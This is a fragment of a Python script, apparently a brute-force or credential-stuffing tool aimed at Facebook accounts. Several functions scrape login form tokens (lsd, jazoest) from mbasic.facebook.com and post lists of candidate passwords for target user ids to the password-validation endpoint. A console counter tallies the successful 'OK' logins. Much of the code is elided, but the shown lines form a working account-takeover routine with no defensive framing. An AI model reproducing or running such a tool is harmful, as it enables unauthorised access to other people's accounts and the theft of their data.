...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [MANi] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def ffb7(ids,names,passlist):
        ...
        try:
                ...
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',)
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			header_freefb = {'Host': 'mbasic.facebook.com',
                ...
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
			lo = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=log_data,headers=header_freefb).text
